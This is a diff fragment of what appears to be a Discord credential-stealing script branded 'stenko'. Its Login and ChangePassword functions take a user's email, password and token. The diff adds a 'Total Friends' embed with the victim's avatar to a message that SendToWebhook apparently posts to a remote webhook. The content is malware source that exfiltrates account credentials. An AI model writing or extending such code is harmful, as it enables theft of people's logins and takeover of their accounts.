@@ -246,16 +246,37 @@ function Login(email, password, token) {
 			"url": `https://stenko.xyz`,
                     },
 		    "thumbnail": {
-                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                     },
                     "footer": {
                         "text": ""
                     }
-                }
-            ]
-        }
-        SendToWebhook(JSON.stringify(params))
-    })
+		}, {
+												"title": `Total Friends`,
+												"color": 3092790,
+												"description": `Total Prieteni`,
+												"author": {
+													"name": "stenko"
+												},
+												"footer": {
+													"text": "stenko"
+												},
+												"thumbnail": {
+													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+												}
+											}]
+										}
+										SendToWebhook(JSON.stringify(params))
+									})
+								})
+							})
+						})
+
+					}
+				})
+			})
+		})
+	})
 }
 
 function ChangePassword(oldpassword, newpassword, token) {
